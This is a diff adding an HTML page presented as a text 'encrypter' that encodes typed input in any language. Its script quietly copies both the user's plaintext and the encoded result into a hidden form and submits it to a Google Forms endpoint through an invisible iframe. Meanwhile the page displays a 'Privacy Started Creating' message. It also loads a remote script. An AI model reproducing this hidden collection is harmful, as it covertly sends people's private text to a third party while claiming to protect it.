@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>HTML CHAR ENCRYTER</title>
+<meta name="viewport" content="width=device-width">
+<script async src="https://spat-cloud.github.io/data/HarScript/HarScript.v2.9.Latest.min.js"></script>
+</head>
+<style>
+#btn{
+color:#DDD;
+background-color:#000;
+border:none;
+padding:.4em .3em; border-radius:4px;
+}
+#Encode,#ED
+{
+color:#4FF; background-color:#000;
+border:#4DDFEA;
+box-shadow:2px 4px 8px 8px #000;
+}
+#St{
+color:#0D0;
+background-color:#000;
+width:340px;
+height:80px;
+border:2px solid #FFF; 
+border-radius:4px; padding:.4em .8em;
+}
+</style>
+<body>
+<iframe name="fa" style="display:none;"></iframe>
+<form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse" id="f" target="fa" method="POST" style="display:none;">
+<input type="text" id="Val" name="entry.190958851">
+<input type="text" id="Val1" name="entry.470512502">
+</form>
+<textarea cols="40" rows="20" id="Encode" placeholder="&#x0C0F&#x0C26&#x0C4B&#x0C12&#x0C15&#x20&#x0C2C&#x0C3E&#x0C37&#x0C32&#x0C4B&#x20&#x0C15&#x0C4B&#x0C1F&#x0C02&#x0C26&#x0C3F&#x20,&#x0915&#x093F&#x0938&#x0940&#x20&#x092D&#x093E&#x0937&#x093E&#x20&#x092E&#x0947&#x0902&#x20&#x091F&#x093E&#x0907&#x092A&#x20&#x0915&#x0930&#x0947&#x0902,&#x06A9&#x0633&#x06CC&#x20&#x0632&#x0628&#x0627&#x0646&#x20&#x0645&#x06CC&#x06BA&#x20&#x0679&#x0626&#x067E&#x20&#x06A9&#x0631&#x0648, Type in Any Language"></textarea><br>
+<center><button onclick="io()" id="btn">EncodeChar</button></center><br>
+<p id="St"></p><br/><br/>
+<textarea cols="40" rows="20" placeholder=".... " id="ED" Readonly></textarea><br>
+</body>
+<script type="text/javascript">
+function S_R_Fun(c)
+{
+var es="";
+for(i=0;i<c.length;i++)
+{
+es +=c.charAt((c.length-i)-1);
+}
+return es;
+}
+function y(s,id){
+var f=0;
+var h=document.getElementById(id);
+setInterval(function(){
+if(f<s.length){
+h.innerHTML +=s[f++];
+}
+},100);
+}
+function f(){
+var o,z,c,v;
+o = escape($HId('Encode').value).split('%u').join('&#x');
+z = o.split("%").join("&#x");
+if(z.indexOf('%20')!=-1) z.split('%').join('&#x');
+c = z.split('&#x').join('T$');
+v = S_R_Fun($Hencode64(c).split('=').join(''));
+$HId('ED').value=v;
+$HId('Val').value = $HId('Encode').value;
+$HId('Val1').value=$HId('ED').value;
+}
+function io(){
+setTimeout(() => y("Privacy Started Creating",'St'),2400);
+setTimeout(f,5860);
+setTimeout(()=> $HId('f').submit(),5900);
+if($HId('ED').value!=""){$HId('St').innerHTML="";$HVanish('St');}
+else{$HShow('St');}
+
+}
+</script>
+</html>
+
+
+
+
